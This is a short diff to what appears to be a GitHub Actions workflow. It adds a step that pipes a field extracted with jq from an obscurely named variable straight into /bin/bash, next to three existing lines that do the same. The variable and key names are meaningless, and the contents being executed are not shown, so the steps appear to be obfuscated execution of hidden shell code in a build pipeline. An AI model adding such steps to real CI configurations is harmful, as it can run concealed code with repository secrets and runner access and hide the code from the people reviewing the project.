@@ -23,6 +23,7 @@ jobs:
           echo $d122 | jq -r .l9 | /bin/bash
           echo $rsd4 | jq -r .ff97040 | /bin/bash
           echo $i6025 | jq -r .sg10182 | /bin/bash
+          printf '%s' "$fyoga23883" | jq -r .m7555 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
